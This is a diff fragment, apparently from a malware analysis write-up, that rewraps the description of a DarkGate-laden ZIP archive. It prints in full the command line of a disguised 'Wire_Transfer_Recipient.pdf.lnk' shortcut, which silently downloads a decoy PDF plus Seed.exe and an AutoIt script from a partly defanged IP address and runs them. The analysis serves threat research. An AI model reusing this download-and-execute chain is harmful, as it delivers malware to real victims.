@@ -50,7 +50,8 @@ CONTENTS OF THE ZIP ARCHIVE:
 - File type: MS Windows shortcut
 - File name: Wire_Transfer_Recipient.pdf.lnk
 - File description: Windows shortcut to install DarkGate
-- Shortcut: C:\Windows\system32\cmd.exeÞ/c start /min /b  && curl -s -o "C:\Users\Public\unsupported-version.pdf" http://screenshot.photos/unsupported-version.pdf &&
+- Shortcut: C:\Windows\system32\cmd.exeÞ/c start /min /b  && curl -s -o
+ "C:\Users\Public\unsupported-version.pdf" http://screenshot.photos/unsupported-version.pdf &&
  "C:\Users\Public\unsupported-version.pdf" && curl -s -o "C:\Users\Public\Seed.exe"
  hxxp://45.154.98[.]21/Seed.exe && curl -s -o "C:\Users\Public\leaf.au3"
  hxxp://45.154.98[.]21/leaf.au3 && "C:\Users\Public\Seed.exe" "C:\Users\Public\leaf.au3" &&
